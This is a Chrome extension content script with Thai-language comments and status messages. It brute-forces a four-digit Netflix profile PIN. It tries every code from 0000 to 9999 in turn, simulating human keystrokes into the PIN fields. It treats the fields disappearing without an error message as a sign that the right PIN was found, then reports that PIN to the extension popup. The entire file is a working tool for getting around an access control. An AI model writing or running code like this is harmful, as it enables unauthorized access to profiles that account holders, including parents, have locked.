console.log('Netflix PIN Auto-Fill content.js loaded');

function formatPin(num) {
  return num.toString().padStart(4, '0');
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function sendStatus(message, pinString = null) {
  try {
    chrome.runtime.sendMessage({action: 'statusUpdate', status: message, pinString});
  } catch (error) {
    console.warn('ไม่สามารถส่งสถานะไป popup ได้', error);
  }
}

function startAutoFillRoutine(config = {}) {
  if (window.isRunning) {
    sendStatus('โปรแกรมกำลังทำงานอยู่แล้ว', formatPin(window.currentPin || 0));
    return;
  }

  const startPin = Number.isFinite(Number(config.startPin)) ? parseInt(config.startPin, 10) : 0;
  window.currentPin = Math.min(Math.max(isNaN(startPin) ? 0 : startPin, 0), 9999);
  window.isRunning = true;
  sendStatus(`เริ่มทำงานจาก PIN: ${formatPin(window.currentPin)}`, formatPin(window.currentPin));

  let keyDelay = Number.isFinite(Number(config.keyDelay)) ? parseInt(config.keyDelay, 10) : 80;
  let codeDelay = Number.isFinite(Number(config.codeDelay)) ? parseInt(config.codeDelay, 10) : 120;
  keyDelay = Math.max(10, isNaN(keyDelay) ? 80 : keyDelay);
  codeDelay = Math.max(10, isNaN(codeDelay) ? 120 : codeDelay);

  async function simulateHumanType(element, text) {
    if (!element) return;

    console.log(`พิมพ์: ${text} ลงใน element`);

    element.value = '';
    element.dispatchEvent(new Event('focus', { bubbles: true }));

    for (let i = 0; i < text.length; i++) {
      const char = text[i];
      element.value += char;

      const keyEvent = new KeyboardEvent('keydown', {
        bubbles: true,
        cancelable: true,
        key: char,
        code: `Digit${char}`,
        keyCode: char.charCodeAt(0),
        which: char.charCodeAt(0)
      });
      element.dispatchEvent(keyEvent);
      element.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, key: char }));
      element.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: char }));
      element.dispatchEvent(new Event('input', { bubbles: true }));
      element.dispatchEvent(new Event('change', { bubbles: true }));
      await sleep(keyDelay);
    }

    element.dispatchEvent(new Event('blur', { bubbles: true }));
  }

  async function startAutoFill() {
    const INPUT_SELECTORS = [
      'input[data-uia="login-pin-input"]',
      '.pin-input',
      '.pin-number-input',
      'input[type="password"]',
      'input[type="number"]',
      'input[maxlength="4"]',
      'input[aria-label*="PIN"]',
      'input[aria-label*="pin"]'
    ];

    while (window.currentPin <= 9999 && window.isRunning) {
      const pinString = formatPin(window.currentPin);
      console.log(`รอบที่ ${window.currentPin}: กำลังทดลองรหัส ${pinString}`);
      sendStatus(`กำลังทดลองรหัส PIN: ${pinString}`, pinString);

      let pinInputs = [];
      for (let selector of INPUT_SELECTORS) {
        pinInputs = document.querySelectorAll(selector);
        if (pinInputs.length > 0) {
          console.log(`พบ ${pinInputs.length} input fields ด้วย selector: ${selector}`);
          break;
        }
      }

      if (pinInputs.length === 0) {
        console.log('ไม่พบช่องกรอก PIN - หน้าเว็บอาจเปลี่ยนไปแล้ว');
        sendStatus('ไม่พบช่องกรอก PIN บนหน้า Netflix', pinString);
        window.isRunning = false;
        break;
      }

      if (pinInputs.length === 1) {
        await simulateHumanType(pinInputs[0], pinString);
      } else if (pinInputs.length >= 4) {
        for (let i = 0; i < 4; i++) {
          await simulateHumanType(pinInputs[i], pinString[i]);
          await sleep(keyDelay);
        }
      }

      console.log('พิมพ์ PIN เสร็จแล้ว แต่ยังไม่กด submit ตามคำขอ');
      await sleep(codeDelay);

      const errorDialog = document.querySelector('.error-message, [data-uia*="error"], .pin-error-message');
      const nextPinInputs = document.querySelectorAll(INPUT_SELECTORS.join(','));

      if (nextPinInputs.length === 0 && !errorDialog) {
        console.log(`เจอ PIN ถูกต้อง: ${pinString}`);
        sendStatus(`เจอ PIN ถูกต้อง: ${pinString}`, pinString);
        window.isRunning = false;
        break;
      }

      if (errorDialog) {
        console.log(`PIN ผิด: ${pinString} - ลองตัวถัดไป`);
      } else {
        console.log('หน้าเปลี่ยนไม่ทันหรือยังไม่แจ้งผล; ยังคงลองต่อ');
      }

      window.currentPin++;
    }

    if (window.currentPin > 9999) {
      console.log('ลองครบทุก PIN จนถึง 9999');
      sendStatus('ลองครบทุก PIN แล้ว');
      window.isRunning = false;
    }
  }

  startAutoFill();
}

function stopAutoFillRoutine() {
  window.isRunning = false;
  console.log('หยุดโปรแกรม');
  sendStatus('หยุดการทำงานแล้ว');
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.command === 'startAutoFill') {
    startAutoFillRoutine(message.config);
    sendResponse({status: 'started'});
  } else if (message.command === 'stopAutoFill') {
    stopAutoFillRoutine();
    sendResponse({status: 'stopped'});
  }
});
